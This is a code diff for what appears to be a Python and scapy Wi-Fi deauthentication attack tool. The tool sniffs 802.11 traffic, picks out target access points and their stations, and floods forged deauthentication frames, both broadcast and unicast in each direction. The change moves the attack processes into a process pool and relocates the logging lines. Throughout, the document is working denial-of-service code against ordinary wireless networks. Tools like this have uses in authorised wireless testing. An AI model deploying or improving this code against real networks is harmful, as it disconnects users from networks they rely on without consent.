@@ -17,8 +17,8 @@
 
 import argparse
 from collections import abc
-import multiprocessing
 import re
+from multiprocessing import pool as mp_pool
 import sys
 
 from scapy import sendrecv
@@ -173,25 +173,13 @@ def unicast_deauth_parallel(deauth_config: DeauthConfig, bssid_sta: str,
         None.
     """
     try:
-        print_info(
-            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
-            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta}'
-        )
-        print_info(
-            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
-            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap}'
-        )
-        sys.stderr = sys.stdout = None
+        sys.stdout = sys.stderr = None
         addr1, addr2 = bssid_sta, bssid_ap
         for _ in range(deauth_config.deauth_rounds * 2):
             sendrecv.sendp(
-                dot11.RadioTap() /
-                dot11.Dot11(
-                    addr1=addr1,
-                    addr2=addr2,
-                    addr3=bssid_net,
-                ) /
-                dot11.Dot11Deauth(reason=7),
+                dot11.RadioTap()
+                / dot11.Dot11(addr1=addr1, addr2=addr2, addr3=bssid_net)
+                / dot11.Dot11Deauth(reason=7),
                 iface=deauth_config.wifi_interface,
                 count=DEAUTH_COUNT,
                 verbose=False,
@@ -214,20 +202,12 @@ def broadcast_deauth_parallel(deauth_config: DeauthConfig, bssid_ap: str,
         None.
     """
     try:
-        print_info(
-            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
-            f' broadcast deauthentication frames from AP {bssid_ap}'
-        )
-        sys.stderr = sys.stdout = None
+        sys.stdout = sys.stderr = None
         for _ in range(deauth_config.deauth_rounds):
             sendrecv.sendp(
-                dot11.RadioTap() /
-                dot11.Dot11(
-                    addr1=BROADCAST,
-                    addr2=bssid_ap,
-                    addr3=bssid_net,
-                ) /
-                dot11.Dot11Deauth(reason=7),
+                dot11.RadioTap()
+                / dot11.Dot11(addr1=BROADCAST, addr2=bssid_ap, addr3=bssid_net)
+                / dot11.Dot11Deauth(reason=7),
                 iface=deauth_config.wifi_interface,
                 count=DEAUTH_COUNT,
                 verbose=False,
@@ -301,8 +281,8 @@ def is_unicast(self: dot11.RadioTap) -> bool:
 
 
 def handle_beacon_proberesp(self: dot11.RadioTap, deauth_config: DeauthConfig,
-                            aps_targetlist: AccessPoints,
-                            aps_whitelist: AccessPoints) -> None:
+                            aps_targetlist: AccessPoints, aps_whitelist: AccessPoints,
+                            deauth_pool: mp_pool.Pool) -> None:
     """Processes a Wi-Fi frame of type management, subtype beacon or probe-resp.
 
     Args:
@@ -310,6 +290,7 @@ def handle_beacon_proberesp(self: dot11.RadioTap, deauth_config: DeauthConfig,
         deauth_config: configuration of the deauthentication attack.
         aps_targetlist: target Wi-Fi access points.
         aps_whitelist: whitelisted Wi-Fi access points.
+        deauth_pool: process pool of the deauthentication attack.
 
     Returns:
         None.
@@ -324,17 +305,21 @@ def handle_beacon_proberesp(self: dot11.RadioTap, deauth_config: DeauthConfig,
         ):
             aps_targetlist.add(bssid_src)
             if deauth_config.broadcast_enabled:
-                multiprocessing.Process(
-                    target=broadcast_deauth_parallel,
-                    args=(deauth_config, bssid_src, bssid_net),
-                    daemon=True,
-                ).start()
+                deauth_pool.apply_async(
+                    broadcast_deauth_parallel,
+                    (deauth_config, bssid_src, bssid_net),
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' broadcast deauthentication frames from AP {bssid_src}'
+                )
     except Exception as e:
         raise MsgException('beacon/probe-resp frame could not be processed') from e
 
 
 def handle_probereq(self: dot11.RadioTap, deauth_config: DeauthConfig,
-                    aps_targetlist: AccessPoints, aps_whitelist: AccessPoints) -> None:
+                    aps_targetlist: AccessPoints, aps_whitelist: AccessPoints,
+                    deauth_pool: mp_pool.Pool) -> None:
     """Processes a Wi-Fi frame of type management, subtype probe-req.
 
     Args:
@@ -342,6 +327,7 @@ def handle_probereq(self: dot11.RadioTap, deauth_config: DeauthConfig,
         deauth_config: configuration of the deauthentication attack.
         aps_targetlist: target Wi-Fi access points.
         aps_whitelist: whitelisted Wi-Fi access points.
+        deauth_pool: process pool of the deauthentication attack.
 
     Returns:
         None.
@@ -357,17 +343,21 @@ def handle_probereq(self: dot11.RadioTap, deauth_config: DeauthConfig,
         ):
             aps_targetlist.add(bssid_dst)
             if deauth_config.broadcast_enabled:
-                multiprocessing.Process(
-                    target=broadcast_deauth_parallel,
-                    args=(deauth_config, bssid_dst, bssid_net),
-                    daemon=True,
-                ).start()
+                deauth_pool.apply_async(
+                    broadcast_deauth_parallel,
+                    (deauth_config, bssid_dst, bssid_net),
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' broadcast deauthentication frames from AP {bssid_dst}'
+                )
     except Exception as e:
         raise MsgException('probe-req frame could not be processed') from e
 
 
 def handle_ctl_data(self: dot11.RadioTap, deauth_config: DeauthConfig,
-                    aps_targetlist: AccessPoints, stations: Stations) -> None:
+                    aps_targetlist: AccessPoints, stations: Stations,
+                    deauth_pool: mp_pool.Pool) -> None:
     """Processes a Wi-Fi frame of type ctl or data.
 
     Args:
@@ -375,6 +365,7 @@ def handle_ctl_data(self: dot11.RadioTap, deauth_config: DeauthConfig,
         deauth_config: configuration of the deauthentication attack.
         aps_targetlist: target Wi-Fi access points.
         stations: target Wi-Fi stations.
+        deauth_pool: process pool of the deauthentication attack.
 
     Returns:
         None.
@@ -388,28 +379,42 @@ def handle_ctl_data(self: dot11.RadioTap, deauth_config: DeauthConfig,
                 and stations.get(bssid_dst) != bssid_src
             ):
                 stations[bssid_dst] = bssid_src
-                multiprocessing.Process(
-                    target=unicast_deauth_parallel,
-                    args=(deauth_config, bssid_dst, bssid_src, bssid_net),
-                    daemon=True,
-                ).start()
+                deauth_pool.apply_async(
+                    unicast_deauth_parallel,
+                    (deauth_config, bssid_dst, bssid_src, bssid_net),
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' deauthentication frames from AP {bssid_src} to STA {bssid_dst}'
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' deauthentication frames from STA {bssid_dst} to AP {bssid_src}'
+                )
             elif (
                 bssid_dst in aps_targetlist
                 and stations.get(bssid_src) != bssid_dst
             ):
                 stations[bssid_src] = bssid_dst
-                multiprocessing.Process(
-                    target=unicast_deauth_parallel,
-                    args=(deauth_config, bssid_src, bssid_dst, bssid_net),
-                    daemon=True,
-                ).start()
+                deauth_pool.apply_async(
+                    unicast_deauth_parallel,
+                    (deauth_config, bssid_src, bssid_dst, bssid_net),
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' deauthentication frames from AP {bssid_dst} to STA {bssid_src}'
+                )
+                print_info(
+                    f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                    f' deauthentication frames from STA {bssid_src} to AP {bssid_dst}'
+                )
     except Exception as e:
         raise MsgException('ctl/data frame could not be processed') from e
 
 
 def handle_frame(self: dot11.RadioTap, deauth_config: DeauthConfig,
                  aps_targetlist: AccessPoints, aps_whitelist: AccessPoints,
-                 stations: Stations) -> None:
+                 stations: Stations, deauth_pool: mp_pool.Pool) -> None:
     """Processes a sniffed Wi-Fi frame.
 
     Args:
@@ -418,6 +423,7 @@ def handle_frame(self: dot11.RadioTap, deauth_config: DeauthConfig,
         aps_targetlist: target Wi-Fi access points.
         aps_whitelist: whitelisted Wi-Fi access points.
         stations: target Wi-Fi stations.
+        deauth_pool: process pool of the deauthentication attack.
 
     Returns:
         None.
@@ -428,18 +434,21 @@ def handle_frame(self: dot11.RadioTap, deauth_config: DeauthConfig,
                 deauth_config,
                 aps_targetlist,
                 aps_whitelist,
+                deauth_pool,
             )
         elif self.haslayer(dot11.Dot11ProbeReq):
             self.handle_probereq(
                 deauth_config,
                 aps_targetlist,
                 aps_whitelist,
+                deauth_pool,
             )
         else:
             self.handle_ctl_data(
                 deauth_config,
                 aps_targetlist,
                 stations,
+                deauth_pool,
             )
     except Exception as e:
         raise MsgException('sniffed Wi-Fi frame could not be processed') from e
@@ -525,23 +534,28 @@ def main() -> None:  # pylint: disable=C0116
         aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
         aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
         stations = Stations(args.essid)
-        if deauth_config.broadcast_enabled:
-            for bssid in aps_targetlist:
-                multiprocessing.Process(
-                    target=broadcast_deauth_parallel,
-                    args=(deauth_config, bssid, bssid),
-                    daemon=True,
-                ).start()
-        sendrecv.sniff(
-            iface=args.wifi_interface,
-            filter=' or '.join(filters),
-            prn=lambda frame: frame.handle_frame(
-                deauth_config,
-                aps_targetlist,
-                aps_whitelist,
-                stations,
-            ),
-        )
+        with mp_pool.Pool(processes=1) as deauth_pool:
+            if deauth_config.broadcast_enabled:
+                for bssid in aps_targetlist:
+                    deauth_pool.apply_async(
+                        broadcast_deauth_parallel,
+                        (deauth_config, bssid, bssid),
+                    )
+                    print_info(
+                        f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
+                        f' broadcast deauthentication frames from AP {bssid}'
+                    )
+            sendrecv.sniff(
+                iface=args.wifi_interface,
+                filter=' or '.join(filters),
+                prn=lambda frame: frame.handle_frame(
+                    deauth_config,
+                    aps_targetlist,
+                    aps_whitelist,
+                    stations,
+                    deauth_pool,
+                ),
+            )
     except MsgException as msg_exception:
         msg_exception.panic()
     except Exception as e:
